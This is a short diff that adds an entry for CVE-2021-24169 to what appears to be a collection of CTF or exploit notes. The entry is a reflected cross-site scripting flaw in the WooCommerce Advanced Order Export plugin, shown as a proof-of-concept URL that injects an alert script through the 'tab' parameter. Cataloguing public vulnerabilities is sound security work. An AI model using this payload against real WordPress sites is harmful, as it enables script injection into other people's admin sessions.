@@ -18,8 +18,8 @@ https://ctf-writeup.revers3c.com/challenges/web/CVE-2020-11110/index.html
 
 
 
-## 
+## CVE-2021-24169
+WordPress Plugin Advanced Order Export For WooCommerce 3.1.7 - Reflected Cross-Site Scripting (XSS)
 
-
-
+```wp-admin/admin.php?page=wc-order-export&tab=</script><script>alert(1)</script>```
 
